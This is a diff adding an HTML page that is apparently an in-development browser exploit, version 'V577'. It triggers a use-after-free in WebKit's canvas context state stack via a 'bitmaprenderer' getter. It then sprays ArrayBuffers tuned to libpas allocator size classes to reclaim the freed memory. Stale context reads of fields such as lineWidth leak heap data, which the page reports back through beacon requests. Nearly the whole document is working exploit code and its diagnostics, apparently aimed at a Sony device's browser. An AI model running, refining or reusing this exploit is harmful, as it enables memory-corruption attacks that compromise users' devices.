@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V577</title></head>
+<body><pre id="out">V577 — butterfly harvest v4 (correct size class)</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(tag,body){
+  var u='/beacon/V577-'+tag+'?d='+encodeURIComponent(String(body).slice(0,400))+'&t='+Date.now();
+  try{new Image().src=u;}catch(e){}
+  setTimeout(function(){try{new Image().src=u+'&r=2';}catch(e){}},200);
+  setTimeout(function(){try{new Image().src=u+'&r=3';}catch(e){}},500);
+}
+var f64=new Float64Array(1);
+var u32=new Uint32Array(f64.buffer);
+function dblHex(d){f64[0]=d;return'0x'+('00000000'+u32[1].toString(16)).slice(-8)+('00000000'+u32[0].toString(16)).slice(-8);}
+
+var P=new URLSearchParams(location.search);
+var NSAVES=+(P.get('saves')||'32');
+var NSPRAY=+(P.get('spray')||'500');
+
+/* Vector growth: max(size+1, max(16, cap + cap/4 + 1)) */
+function wtfVectorCap(needed) {
+  if (needed <= 1) return 1;
+  var cap = 1;
+  while (cap < needed) {
+    cap = Math.max(cap + 1, Math.max(16, Math.floor(cap + cap / 4 + 1)));
+  }
+  return cap;
+}
+var VCAP = wtfVectorCap(NSAVES + 1);
+
+/* sizeof(State) = ~400B (from WK-1400 struct layout).
+   Buffer = VCAP * sizeof(State) = 34 * 400 = 13600.
+
+   KEY INSIGHT: libpas medium segregated aligns to 512 bytes.
+   13600 → size class ceil(13600/512)*512 = 13824 (27*512).
+   ONLY ABs of 13313-13824 bytes land in this class.
+   Previous sprays (13200, 16384) ALL hit WRONG classes. */
+
+var SIZEOF_LO = 400;
+var SIZEOF_HI = 448;
+var BUF_LO = VCAP * SIZEOF_LO;
+var BUF_HI = VCAP * SIZEOF_HI;
+
+function sizeClass512(n) { return Math.ceil(n / 512) * 512; }
+
+var SC_LO = sizeClass512(BUF_LO);
+var SC_HI = sizeClass512(BUF_HI);
+
+/* Spray sizes: exact buffer sizes + their size-class ceilings.
+   This covers both possible sizeof(State) values. */
+var SIZES = [];
+function addSize(s) { if (SIZES.indexOf(s) < 0 && s > 0) SIZES.push(s); }
+addSize(BUF_LO);   /* 13600 → class 13824 */
+addSize(BUF_HI);   /* 15232 → class 15360 */
+addSize(SC_LO);    /* 13824 (exact class boundary) */
+addSize(SC_HI);    /* 15360 (exact class boundary) */
+SIZES.sort(function(a,b){return a-b;});
+
+bk('BOOT','v5-diag,saves='+NSAVES+',spray='+NSPRAY+',vcap='+VCAP+',buf='+BUF_LO+'/'+BUF_HI+',sc='+SC_LO+'/'+SC_HI);
+say('V577v5 DIAGNOSTIC saves='+NSAVES+' spray='+NSPRAY+' vcap='+VCAP);
+say('Buffer: '+BUF_LO+'-'+BUF_HI+'B → classes: '+SC_LO+'/'+SC_HI);
+say('Spray sizes: '+SIZES.join(', '));
+
+/* ===== UAF ===== */
+var innerCtx = null;
+function triggerUAF() {
+  var c = document.createElement('canvas');
+  c.width = 1; c.height = 1;
+  var d = {};
+  Object.defineProperty(d, 'alpha', {get: function() {
+    var ctx = c.getContext('2d');
+    innerCtx = ctx;
+    ctx.lineWidth = 1337.1337;
+    for (var s = 0; s < NSAVES; s++) ctx.save();
+    ctx.lineWidth = 1337.1337;
+    return true;
+  }});
+  c.getContext('bitmaprenderer', d);
+  return c;
+}
+
+bk('PRE-UAF','triggering');
+var sprayABs = new Array(NSPRAY * SIZES.length);
+var sprayIdx = 0;
+var outerC = triggerUAF();
+
+/* ======================================================================
+   CRITICAL SECTION: ZERO DOM/Image allocations until after all reads.
+   Image objects from bk() are ~768B and can reclaim the freed context
+   slot, corrupting m_stateStack metadata and causing SIGSEGV.
+   ====================================================================== */
+
+/* Spray: NSPRAY ABs per size class */
+var perSize = NSPRAY;
+for (var si = 0; si < SIZES.length; si++) {
+  var sz = SIZES[si];
+  for (var i = 0; i < perSize; i++) {
+    try {
+      var ab = new ArrayBuffer(sz);
+      var dv = new Float64Array(ab);
+      for (var j = 0; j < dv.length; j++) dv[j] = (si + 1) * 10000000 + j;
+      sprayABs[sprayIdx++] = ab;
+    } catch(e) { break; }
+  }
+}
+
+/* ====== Spray survived — beacon to confirm ====== */
+bk('SPRAY-OK','n='+sprayIdx+',sizes='+SIZES.join('/'));
+say('Spray done: '+sprayIdx+' ABs across '+SIZES.join('/'));
+
+/* DIAGNOSTIC: If SPRAY-OK arrives but no READ-OK → lineWidth SIGSEGV
+   = freed stateStack buffer pages munmapped by Sony's allocator
+   = butterfly harvest approach DEAD, need different info leak */
+
+/* READ — through stale m_stateStack.m_buffer (14KB external buffer) */
+var lw, ok = false, readErr = '';
+try { lw = innerCtx.lineWidth; ok = true; } catch(e) { readErr = e.name; }
+
+var ml, ga, sb, ldo, xf;
+var mlOK=false, gaOK=false, sbOK=false, ldoOK=false, xfOK=false;
+if (ok) {
+  try { ml = innerCtx.miterLimit; mlOK = true; } catch(e) {}
+  try { ga = innerCtx.globalAlpha; gaOK = true; } catch(e) {}
+  try { sb = innerCtx.shadowBlur; sbOK = true; } catch(e) {}
+  try { ldo = innerCtx.lineDashOffset; ldoOK = true; } catch(e) {}
+  try { xf = innerCtx.getTransform(); xfOK = true; } catch(e) {}
+}
+
+if (!ok) {
+  bk('CRASH','err='+readErr);
+  say('\nCRASH: lineWidth read failed ('+readErr+')');
+} else {
+  bk('LW','val='+lw+',hex='+dblHex(lw));
+  say('\nlineWidth = '+lw+' hex='+dblHex(lw));
+
+  if (lw === 1337.1337) {
+    bk('ORIG','spray-missed');
+    say('ORIGINAL — spray missed the freed buffer.');
+  } else if (lw === 0) {
+    bk('ZERO','zero-read');
+    say('ZERO — buffer reclaimed, calloc zeroed, fill didnt cover lineWidth offset');
+  } else if (lw >= 10000000 && lw < 10000000 * (SIZES.length + 2)) {
+    var sizeIdx = Math.floor(lw / 10000000) - 1;
+    var slot = Math.round(lw - (sizeIdx + 1) * 10000000);
+    var byteOff = slot * 8;
+    var hitSz = SIZES[sizeIdx];
+    bk('HIT','si='+sizeIdx+',sz='+hitSz+',slot='+slot+',byte='+byteOff);
+    say('*** AB HIT ***');
+    say('  Size: '+hitSz+' slot:'+slot+' byte:'+byteOff);
+
+    for (var lwOff = 0; lwOff <= 256; lwOff += 8) {
+      var ssz = (byteOff - lwOff) / NSAVES;
+      if (ssz === Math.floor(ssz) && ssz >= 350 && ssz <= 500) {
+        var tag = (lwOff === 48) ? ' <<<PRIMARY>>>' : (lwOff === 144) ? ' <<<ALT>>>' : '';
+        bk('SIZEOF','lwOff='+lwOff+',sizeof='+ssz+tag);
+        say('  sizeof(State)='+ssz+' if lineWidth@+'+lwOff+tag);
+      }
+    }
+  } else {
+    bk('UNK','val='+lw+',hex='+dblHex(lw));
+    say('*** UNEXPECTED — possible heap data ***');
+    say('  hex: '+dblHex(lw));
+  }
+
+  if (mlOK) { bk('ML','val='+ml+',hex='+dblHex(ml)); say('  miterLimit='+ml+' hex='+dblHex(ml)); }
+  if (gaOK) { bk('GA','val='+ga+',hex='+dblHex(ga)); say('  globalAlpha='+ga+' hex='+dblHex(ga)); }
+  if (sbOK) { bk('SB','val='+sb+',hex='+dblHex(sb)); say('  shadowBlur='+sb); }
+  if (ldoOK) { bk('LDO','val='+ldo+',hex='+dblHex(ldo)); say('  lineDashOffset='+ldo); }
+  if (xfOK) {
+    bk('XF','a='+dblHex(xf.a)+',b='+dblHex(xf.b)+',c='+dblHex(xf.c)+',d='+dblHex(xf.d)+',e='+dblHex(xf.e)+',f='+dblHex(xf.f));
+    say('  xform: a='+xf.a+' b='+xf.b+' c='+xf.c+' d='+xf.d+' e='+xf.e+' f='+xf.f);
+  }
+}
+
+bk('DONE','v5');
+say('\nV577v5 complete.');
+</script>
+</body></html>
